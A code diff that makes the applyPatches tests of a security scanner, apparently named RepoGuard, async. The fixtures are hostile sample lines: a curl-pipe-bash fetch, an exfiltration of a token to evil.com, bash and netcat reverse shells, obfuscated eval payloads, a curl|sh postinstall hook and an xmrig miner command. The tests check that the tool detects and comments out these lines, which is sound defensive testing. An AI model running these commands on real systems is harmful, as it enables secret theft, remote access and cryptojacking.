@@ -3,7 +3,7 @@ import type { Finding } from "../src/types";
 
 describe("pullRequest", () => {
   describe("applyPatches", () => {
-    it("patches curl-pipe-bash and returns it as a patched finding", () => {
+    it("patches curl-pipe-bash and returns it as a patched finding", async () => {
       const original = "curl http://example.com/malicious.sh | bash";
       const findings: Finding[] = [
         {
@@ -13,13 +13,13 @@ describe("pullRequest", () => {
           file: "test.sh",
         },
       ];
-      const { patchedContent, patchedFindings } = applyPatches(original, findings, "test.sh");
+      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.sh");
       expect(patchedContent).toContain("# REMOVED BY REPOGUARD: curl|bash");
       expect(patchedFindings).toHaveLength(1);
       expect(patchedFindings[0].rule).toBe("curl-pipe-bash");
     });
 
-    it("does not patch env-exfiltration and returns no patched findings", () => {
+    it("does not patch env-exfiltration and returns no patched findings", async () => {
       const original = "const token = process.env.TOKEN; axios.get('http://evil.com/?t=' + token);";
       const findings: Finding[] = [
         {
@@ -29,12 +29,12 @@ describe("pullRequest", () => {
           file: "test.js",
         },
       ];
-      const { patchedContent, patchedFindings } = applyPatches(original, findings, "test.js");
+      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.js");
       expect(patchedContent).toBe(original);
       expect(patchedFindings).toHaveLength(0);
     });
 
-    it("patches obfuscated-malware-pattern and comments out malware and createRequire bypasses", () => {
+    it("patches obfuscated-malware-pattern and comments out malware and createRequire bypasses", async () => {
       const original = "import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\nglobal['!']='8-2728';var _$_1e42=(function(l,e){})(...);";
       const findings: Finding[] = [
         {
@@ -44,14 +44,14 @@ describe("pullRequest", () => {
           file: "test.js",
         },
       ];
-      const { patchedContent, patchedFindings } = applyPatches(original, findings, "test.js");
+      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.js");
       expect(patchedContent).toContain("// REMOVED BY REPOGUARD: obfuscated malware payload");
       expect(patchedContent).toContain("// REMOVED BY REPOGUARD: createRequire import for malware");
       expect(patchedContent).toContain("// REMOVED BY REPOGUARD: require definition for malware");
       expect(patchedFindings).toHaveLength(1);
     });
 
-    it("patches reverse-shell", () => {
+    it("patches reverse-shell", async () => {
       const original = "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\nnc -e /bin/sh 1.1.1.1 4444";
       const findings: Finding[] = [
         {
@@ -61,13 +61,13 @@ describe("pullRequest", () => {
           file: "test.sh",
         },
       ];
-      const { patchedContent, patchedFindings } = applyPatches(original, findings, "test.sh");
+      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.sh");
       expect(patchedContent).toContain("# REMOVED BY REPOGUARD: reverse shell");
       expect(patchedContent).toContain("# REMOVED BY REPOGUARD: netcat reverse shell");
       expect(patchedFindings).toHaveLength(1);
     });
 
-    it("patches obfuscated-base64", () => {
+    it("patches obfuscated-base64", async () => {
       const original = "eval(String.fromCharCode(97, 98, 99))\neval(Buffer.from('abc').toString())";
       const findings: Finding[] = [
         {
@@ -77,13 +77,13 @@ describe("pullRequest", () => {
           file: "test.js",
         },
       ];
-      const { patchedContent, patchedFindings } = applyPatches(original, findings, "test.js");
+      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.js");
       expect(patchedContent).toContain("// REMOVED BY REPOGUARD: obfuscated eval");
       expect(patchedContent).toContain("// REMOVED BY REPOGUARD: base64 obfuscated payload");
       expect(patchedFindings).toHaveLength(1);
     });
 
-    it("patches suspicious-npm-postinstall in package.json and handles JSON parsing error", () => {
+    it("patches suspicious-npm-postinstall in package.json and handles JSON parsing error", async () => {
       const validJson = JSON.stringify({ scripts: { postinstall: "curl | sh" } });
       const invalidJson = "{ scripts: { postinstall: 'curl | sh' }";
       
@@ -96,16 +96,16 @@ describe("pullRequest", () => {
         },
       ];
 
-      const res1 = applyPatches(validJson, findings, "package.json");
+      const res1 = await applyPatches(validJson, findings, "package.json");
       expect(res1.patchedContent).toContain("# REMOVED BY REPOGUARD: suspicious postinstall script");
       expect(res1.patchedFindings).toHaveLength(1);
 
-      const res2 = applyPatches(invalidJson, findings, "package.json");
+      const res2 = await applyPatches(invalidJson, findings, "package.json");
       expect(res2.patchedContent).toBe(invalidJson);
       expect(res2.patchedFindings).toHaveLength(0);
     });
 
-    it("patches crypto-miner-keywords", () => {
+    it("patches crypto-miner-keywords", async () => {
       const original = "xmrig --url xmr.pool";
       const findings: Finding[] = [
         {
@@ -115,7 +115,7 @@ describe("pullRequest", () => {
           file: "miner.sh",
         },
       ];
-      const { patchedContent, patchedFindings } = applyPatches(original, findings, "miner.sh");
+      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "miner.sh");
       expect(patchedContent).toContain("# REMOVED BY REPOGUARD: crypto miner");
       expect(patchedFindings).toHaveLength(1);
     });
